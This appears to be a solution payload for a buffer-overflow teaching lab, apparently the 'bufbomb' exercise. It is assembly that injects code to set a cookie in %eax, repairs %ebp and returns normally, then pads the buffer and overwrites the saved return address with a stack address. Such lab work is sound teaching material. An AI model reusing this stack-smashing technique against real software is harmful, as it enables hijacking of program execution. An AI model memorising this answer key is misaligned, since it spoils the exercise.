COOKIE   = 0x7d97e567
RETADDR  = 0x08048d70
HACKADDR = 0x556834a8

hack_boom:
    mov $COOKIE, %eax
    lea 0x18(%esp), %ebp
    push $RETADDR
    ret

.fill (40 - (. - hack_boom)), 1, 0

.long 0
.long HACKADDR

.byte 0x0a
